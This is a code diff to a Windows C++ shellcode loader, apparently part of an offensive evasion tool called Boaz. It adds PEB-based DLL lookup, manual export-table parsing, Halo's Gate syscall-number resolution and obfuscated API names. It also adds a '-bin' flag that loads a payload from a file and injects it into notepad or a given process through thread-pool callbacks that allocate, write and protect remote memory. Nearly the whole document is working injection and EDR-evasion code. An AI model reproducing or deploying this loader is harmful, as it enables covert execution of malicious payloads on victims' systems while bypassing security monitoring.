@@ -9,7 +9,7 @@ Jump code example, decoy
 # This file is part of the Boaz tool
 # Copyright (c) 2019-2024 Thomas M
 # Licensed under the GPLv3 or later.
-#
+# update support argument -bin position_independent_code.bin as input instead of hardcoded code. 
 **/
 /***
 
@@ -17,6 +17,114 @@ Jump code example, decoy
 #include <windows.h>
 #include <stdio.h>
 #include <winternl.h>
+
+
+
+/** original code by: Alice Climent-Pommeret */
+
+void * GetFunctionAddress(const char * MyNtdllFunction, PVOID MyDLLBaseAddress) {
+
+	DWORD j;
+	uintptr_t RVA = 0;
+	
+	//Parse DLL loaded in memory
+	const LPVOID BaseDLLAddr = (LPVOID)MyDLLBaseAddress;
+	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) BaseDLLAddr;
+	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) BaseDLLAddr + pImgDOSHead->e_lfanew);
+
+    	//Get the Export Directory Structure
+	PIMAGE_EXPORT_DIRECTORY pImgExpDir =(PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseDLLAddr+pImgNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    	//Get the functions RVA array
+	PDWORD Address=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfFunctions);
+
+    	//Get the function names array 
+	PDWORD Name=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNames);
+
+    	//get the Ordinal array
+	PWORD Ordinal=(PWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNameOrdinals);
+
+	//Get RVA of the function from the export table
+	for(j=0;j<pImgExpDir->NumberOfNames;j++){
+        	if(!strcmp(MyNtdllFunction,(char*)BaseDLLAddr+Name[j])){
+			//if function name found, we retrieve the RVA
+         		// RVA = (uintptr_t)((LPBYTE)Address[Ordinal[j]]);
+                RVA = Address[Ordinal[j]];
+
+			break;
+		}
+	}
+	
+    	if(RVA){
+		//Compute RVA to find the current address in the process
+	    	uintptr_t moduleBase = (uintptr_t)BaseDLLAddr;
+	    	uintptr_t* TrueAddress = (uintptr_t*)(moduleBase + RVA);
+	    	return (PVOID)TrueAddress;
+    	}else{
+        	return (PVOID)RVA;
+    	}
+}
+
+void * DLLViaPEB(wchar_t * DllNameToSearch){
+
+    	PPEB pPeb = 0;
+	PLDR_DATA_TABLE_ENTRY pDataTableEntry = 0;
+	PVOID DLLAddress = 0;
+
+	//Retrieve from the TEB (Thread Environment Block) the PEB (Process Environment Block) address
+    	#ifdef _M_X64
+        //If 64 bits architecture
+        	PPEB pPEB = (PPEB) __readgsqword(0x60);
+    	#else
+        //If 32 bits architecture
+        	PPEB pPEB = (PPEB) __readfsdword(0x30);
+    	#endif
+
+	//Retrieve the PEB_LDR_DATA address
+	PPEB_LDR_DATA pLdr = pPEB->Ldr;
+
+	//Address of the First PLIST_ENTRY Structure
+    	PLIST_ENTRY AddressFirstPLIST = &pLdr->InMemoryOrderModuleList;
+
+	//Address of the First Module which is the program itself
+	PLIST_ENTRY AddressFirstNode = AddressFirstPLIST->Flink;
+
+    	//Searching through all module the DLL we want
+	for (PLIST_ENTRY Node = AddressFirstNode; Node != AddressFirstPLIST ;Node = Node->Flink) // Node = Node->Flink is the next module
+	{
+		// Node is pointing to InMemoryOrderModuleList in the LDR_DATA_TABLE_ENTRY structure.
+        	// InMemoryOrderModuleList is at the second position in this structure.
+		// To cast in the proper type, we need to go at the start of the structure.
+        	// To do so, we need to subtract 1 byte. Indeed, InMemoryOrderModuleList is at 0x008 from the start of the structure) 
+		Node = Node - 1;
+
+        	// DataTableEntry structure
+		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)Node;
+
+        	// Retrieve de full DLL Name from the DataTableEntry
+        	wchar_t * FullDLLName = (wchar_t *)pDataTableEntry->FullDllName.Buffer;
+
+        	//We lower the full DLL name for comparaison purpose
+        	for(int size = wcslen(FullDLLName), cpt = 0; cpt < size ; cpt++){
+            		FullDLLName[cpt] = tolower(FullDLLName[cpt]);
+        	}
+
+        	// We check if the full DLL name is the one we are searching
+        	// If yes, return  the dll base address
+        	if(wcsstr(FullDLLName, DllNameToSearch) != NULL){
+            		DLLAddress = (PVOID)pDataTableEntry->DllBase;
+            		return DLLAddress;
+        	}
+
+		// Now, We need to go at the original position (InMemoryOrderModuleList), to be able to retrieve the next Node with ->Flink
+		Node = Node + 1;
+	}
+
+    	return DLLAddress;
+}
+
+/* API retrival end.*/
+
 
 
 typedef DWORD(WINAPI *PFN_GETLASTERROR)();
@@ -46,6 +154,16 @@ typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
     SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
     ULONG bytesWritten;
 } NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;
+
+// protect virtual memory: 
+typedef struct _NTPROTECTVIRTUALMEMORY_ARGS {
+    UINT_PTR pNtProtectVirtualMemory;    // pointer to NtProtectVirtualMemory - rax
+    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
+    PVOID* address;                      // PVOID *BaseAddress - rdx
+    PSIZE_T size;                        // PSIZE_T RegionSize - r8
+    ULONG newProtect;                    // ULONG NewProtect - r9
+    PULONG oldProtect;                   // PULONG OldProtect - stack
+} NTPROTECTVIRTUALMEMORY_ARGS, *PNTPROTECTVIRTUALMEMORY_ARGS;
 
 
 typedef NTSTATUS(NTAPI* myNtTestAlert)(
@@ -82,14 +200,117 @@ typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
 );
 
 
+
+// WorkCallback functions: 
 extern "C" {
-    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK AllocateMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
     VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK ProtectMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK RtlUserThreadStartCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK BaseThreadInitThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
+    VOID CALLBACK BaseThreadInitXFGThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
     VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
     VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
 }
 
 
+PVOID findSyscallInstruction(const char* apiName, FARPROC pApi, int occurrence)
+{
+    if (!pApi) {
+        printf("[-] Invalid function pointer passed for %s.\n", apiName);
+        return NULL;
+    }
+
+
+    printf("[+] Searching for syscall #%d in %s @ %p\n", occurrence, apiName, pApi);
+
+    const unsigned char syscall_pattern[] = { 0x0F, 0x05 }; //or also checks 0xC3 for ret 
+    BYTE* addr = (BYTE*)pApi;
+    BYTE* end  = addr + 0x100;
+
+    int found = 0;
+    while (addr <= end - sizeof(syscall_pattern)) {
+        if (addr[0] == syscall_pattern[0] && addr[1] == syscall_pattern[1]) {
+            found++;
+            if (found == occurrence) {
+                printf("[+] Found syscall #%d for %s at %p\n", occurrence, apiName, addr);
+                return addr;
+            }
+        }
+        addr++;
+    }
+
+    printf("[-] Only found %d syscall(s), syscall #%d not found for %s\n", found, occurrence, apiName);
+    return NULL;
+}
+
+extern "C" {
+    DWORD SSNAllocateVirtualMemory;
+    DWORD SSNWriteVirtualMemory;
+    DWORD SSNCreateThreadEx;
+    DWORD SSNProtectVirtualMemory;
+    DWORD SSNWaitForSingleObject;
+}
+
+// Halo's gate syscall
+#define UP -32
+#define DOWN 32
+WORD GetsyscallNum(LPVOID addr) {
+
+
+    WORD syscall = 0;
+
+    if (*((PBYTE)addr) == 0x4c
+        && *((PBYTE)addr + 1) == 0x8b
+        && *((PBYTE)addr + 2) == 0xd1
+        && *((PBYTE)addr + 3) == 0xb8
+        && *((PBYTE)addr + 6) == 0x00
+        && *((PBYTE)addr + 7) == 0x00) {
+
+        BYTE high = *((PBYTE)addr + 5);
+        BYTE low = *((PBYTE)addr + 4);
+        syscall = (high << 8) | low;
+
+        return syscall;
+
+    }
+
+    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP
+    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
+        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {
+
+        for (WORD idx = 1; idx <= 500; idx++) {
+            if (*((PBYTE)addr + idx * DOWN) == 0x4c
+                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
+                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
+                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
+                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
+                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
+                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
+                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
+                syscall = (high << 8) | low - idx;
+
+                return syscall;
+            }
+            if (*((PBYTE)addr + idx * UP) == 0x4c
+                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
+                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
+                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
+                && *((PBYTE)addr + 6 + idx * UP) == 0x00
+                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
+                BYTE high = *((PBYTE)addr + 5 + idx * UP);
+                BYTE low = *((PBYTE)addr + 4 + idx * UP);
+
+                syscall = (high << 8) | low + idx;
+
+                return syscall;
+
+            }
+
+        }
+
+    }
+}
 
 BOOL IsSystem64Bit() {
     HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
@@ -196,6 +417,7 @@ unsigned char trampoline[] =
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 
+
 // "\x41\x55\xb9\xf0\x1d\xd3\xad\x41\x54\x55\x57\x56\x53\x48\x83\xec"
 // "\x48\xe8\x7a\x01\x00\x00\xb9\x53\x17\xe6\x70\x48\x89\xc3\xe8\x6d"
 // "\x01\x00\x00\x48\x89\xc6\x48\x85\xdb\x74\x56\x48\x89\xd9\xba\xda"
@@ -261,12 +483,20 @@ unsigned char trampoline[] =
 // "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 // "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 
+// -bin: 
+unsigned char* magic_code = NULL;
+SIZE_T allocatedSize = 0; 
+
+unsigned char magiccode[] = ####SHELLCODE####;
+
+// -bin
+BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);
 
 
 int main(int argc, char *argv[]) {
 
 
-    unsigned char magiccode[] = ####SHELLCODE####;
+    // unsigned char magiccode[] = 
 
 
     STARTUPINFO si;
@@ -277,81 +507,152 @@ int main(int argc, char *argv[]) {
     DWORD pid = 0;
     char notepadPath[256] = {0};  // Initialize the buffer
 
-    //check if pid is provided as argument: 
-    if (argc > 1) {
-        pid = atoi(argv[1]);
-        printf("[+] PID provided: %d\n", pid);
+    PCWSTR binPath = nullptr;
+    // Parse -pid and -bin
+    for (int i = 1; i < argc; ++i) {
+        if (strcmp(argv[i], "-pid") == 0) {
+            if (i + 1 < argc && argv[i + 1][0] >= '0' && argv[i + 1][0] <= '9') {
+                pid = atoi(argv[i + 1]);
+                i++; // skip PID argument
+            }
+        } else if (strcmp(argv[i], "-bin") == 0) {
+            if (i + 1 >= argc || argv[i + 1][0] == '-') {
+                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
+                fprintf(stderr, "    Usage: loader.exe [-pid <pid>] -bin <path_to_magiccode>\n");
+                exit(1);
+            }
+            size_t wlen = strlen(argv[i + 1]) + 1;
+            wchar_t* wpath = new wchar_t[wlen];
+            mbstowcs(wpath, argv[i + 1], wlen);
+            binPath = wpath;
+            i++; // skip bin path
+        }
+    }
+
+    // If PID was provided, open handles
+    if (pid > 0) {
+        printf("[+] PID provided: %lu\n", (unsigned long)pid);
+
         // get pi information from pid:
         pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
     } else {
-        printf("[-] PID not provided\n");
-        // Determine the correct Notepad path based on system architecture
+        
+        printf("[-] PID not provided or invalid, launching default process\n");
+
         if (IsSystem64Bit()) {
             strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
+            // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
+            // or svchost.exe
         } else {
             strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
         }
 
-        // Attempt to create a process with Notepad
         BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
         if (!success) {
             MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
-            return 1; // Exit if unable to start Notepad
+            return 1;
         }
-        printf("[+] Notepad started with default settings.\n");
-        pid = pi.dwProcessId;  
-        printf("[+] notepad PID: %d\n", pid);      
+        printf("Notepad started with default settings.\n");
+        pid = pi.dwProcessId;
+        printf("[+] notepad PID: %lu\n", (unsigned long)pid);
     }
 
-    // LPVOID allocatedAddress = NULL;
+    // -bin
+    if (binPath) {
+        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
+            fprintf(stderr, "[-] Failed to read binary file\n");
+        } else {
+            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
+            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
+        }
+    } else {
+        magic_code = magiccode; 
+        allocatedSize = sizeof(magiccode);
+        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
+        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
+    }
+    // -bin
+
+    printf("\033[32m[+] press any key to continue\033[0m\n");
+    getchar();
+
     PVOID allocatedAddress = NULL;
 
-    SIZE_T allocatedsize = sizeof(magiccode);
 
     //print the first 8 bytes of the magiccode and the last 8 bytes:
-    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
-    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[sizeof(magiccode) - 8], magiccode[sizeof(magiccode) - 7], magiccode[sizeof(magiccode) - 6], magiccode[sizeof(magiccode) - 5], magiccode[sizeof(magiccode) - 4], magiccode[sizeof(magiccode) - 3], magiccode[sizeof(magiccode) - 2], magiccode[sizeof(magiccode) - 1]);
-    
+    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[0], magic_code[1], magic_code[2], magic_code[3], magic_code[4], magic_code[5], magic_code[6], magic_code[7]);
+    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[sizeof(magic_code) - 8], magic_code[sizeof(magic_code) - 7], magic_code[sizeof(magic_code) - 6], magic_code[sizeof(magic_code) - 5], magic_code[sizeof(magic_code) - 4], magic_code[sizeof(magic_code) - 3], magic_code[sizeof(magic_code) - 2], magic_code[sizeof(magic_code) - 1]);
+
 
 	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
+    wchar_t wideLibName[32] = {0};
+
+    for (int i = 0; libName[i] != 0; i++) {
+        wideLibName[i] = (wchar_t)libName[i];
+    }
+
 	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
+    const char TpAllocFuture[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k', 0 };
+    const char TpPostFuture[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k', 0 };
+    const char TpReleaseFuture[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0 };
+
+    // HMODULE ntdllMod = GetModuleHandleA(libName);
+    HMODULE ntdllMod = (HMODULE)DLLViaPEB(wideLibName);
+    PVOID allocateFuture = GetFunctionAddress(NtAllocateFuture, ntdllMod);
+
+    PVOID syscallAddr1 = findSyscallInstruction(NtAllocateFuture, (FARPROC)allocateFuture, 1);
+    
+    SSNAllocateVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)allocateFuture);
+    if(SSNAllocateVirtualMemory) {
+        printf("[+] Found syscall number: %d\n", SSNAllocateVirtualMemory);
+    } else {
+        printf("[-] Failed to find syscall number\n");
+    }
+
+
     NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
-    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), NtAllocateFuture);
+    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) syscallAddr1;
     ntAllocateVirtualMemoryArgs.hProcess = pi.hProcess;
     ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
-    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
+    ntAllocateVirtualMemoryArgs.size = &allocatedSize;
     ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;
 
     /// Set workers
-    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA(libName), "TpAllocWork");
-    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA(libName), "TpPostWork");
-    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA(libName), "TpReleaseWork");
+    FARPROC pTpAllocWork = GetProcAddress(ntdllMod, TpAllocFuture);
+    FARPROC pTpPostWork = GetProcAddress(ntdllMod, TpPostFuture);
+    FARPROC pTpReleaseWork = GetProcAddress(ntdllMod, TpReleaseFuture);
 
     PTP_WORK WorkReturn = NULL;
     // getchar();
-    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
+    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)AllocateMemory, &ntAllocateVirtualMemoryArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
-    // getchar();
 
     printf("[*] allocatedAddress: %p\n", allocatedAddress);
-    if(allocatedsize != sizeof(magiccode)) {
+    if(allocatedSize != sizeof(magiccode)) {
         printf("[*] Allocated size is not the same as magiccode size\n");
-        printf("[*] Allocated size: %lu\n", allocatedsize);
+        printf("[*] Allocated size: %lu\n", allocatedSize);
         printf("[*] MagicCode size: %lu\n", sizeof(magiccode));
     }
 
 
+
 	///Write process memory: 
+    const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
+
+    PVOID writeFuture = GetFunctionAddress(NtWriteFuture, ntdllMod);
+    PVOID syscallAddr2 = findSyscallInstruction(NtWriteFuture, (FARPROC)writeFuture, 1);
+    SSNWriteVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)writeFuture);
+    
 
     ULONG bytesWritten = 0;
     NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
-    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA(libName), "NtWriteVirtualMemory");
+    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) syscallAddr2;
     ntWriteVirtualMemoryArgs.hProcess = pi.hProcess;
     ntWriteVirtualMemoryArgs.address = allocatedAddress;
-    ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
-    ntWriteVirtualMemoryArgs.size = allocatedsize;
+    ntWriteVirtualMemoryArgs.buffer = (PVOID)magic_code;
+    ntWriteVirtualMemoryArgs.size = allocatedSize;
     ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;
 
     // // // / Set workers
@@ -361,11 +662,18 @@ int main(int argc, char *argv[]) {
     ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
+    printf("Bytes written: %lu\n", bytesWritten);
+
+    if(WorkReturn2 == NULL) {
+        printf("[-] Failed to write memory\n");
+    } else {
+        printf("[+] Memory written\n");
+    }
 
 
     // Change protection: 
     // DWORD oldProtect;
-    // bool results = VirtualProtectEx(pi.hProcess, allocatedAddress, allocatedsize, PAGE_EXECUTE_READ, &oldProtect);
+    // bool results = VirtualProtectEx(pi.hProcess, allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
     // if(results) {
     //     printf("[+] VirtualProtectEx success\n");
     // } else {
@@ -385,7 +693,7 @@ int main(int argc, char *argv[]) {
 
     PTP_WORK WorkReturn3 = NULL;
     // getchar();
-    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
+    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)AllocateMemory, &ntAllocateVirtualMemoryArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);
 
@@ -411,9 +719,9 @@ int main(int argc, char *argv[]) {
 
     LPVOID sizeExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, trampolineSize, (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");
     printf("[+] Found sizeExInTrampoline at: 0x%p\n", sizeExInTrampoline);
-    // // we need to ensure allocatedsize is of 4 bytes size, we can use memcpy to copy the 4 bytes to the trampoline:
-    memcpy(sizeExInTrampoline, &allocatedsize, sizeof(SIZE_T));
-    // memcpy(sizeExInTrampoline, &allocatedsize, 8);
+    // // we need to ensure allocatedSize is of 4 bytes size, we can use memcpy to copy the 4 bytes to the trampoline:
+    memcpy(sizeExInTrampoline, &allocatedSize, sizeof(SIZE_T));
+    // memcpy(sizeExInTrampoline, &allocatedSize, 8);
     // call FlushInstructionCache
     result = FlushInstructionCache(pi.hProcess, NULL, 0);
     if(result) {
@@ -438,7 +746,6 @@ int main(int argc, char *argv[]) {
     ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
     ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
-
 
 
     //####END####
@@ -481,4 +788,40 @@ void SimpleSleep(DWORD dwMilliseconds)
         WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
         CloseHandle(hEvent); // Clean up the event object
     }
+}
+
+BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
+{
+    FILE* f = NULL;
+    _wfopen_s(&f, Filepath, L"rb");
+    if (!f) {
+        return FALSE;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long fileSize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (fileSize <= 0) {
+        fclose(f);
+        return FALSE;
+    }
+
+    unsigned char* buffer = (unsigned char*)malloc(fileSize);
+    if (!buffer) {
+        fclose(f);
+        return FALSE;
+    }
+
+    size_t bytesRead = fread(buffer, 1, fileSize, f);
+    fclose(f);
+
+    if (bytesRead != fileSize) {
+        free(buffer);
+        return FALSE;
+    }
+
+    *magiccode = buffer;
+    *magiccodeSize = (SIZE_T)fileSize;
+    return TRUE;
 }
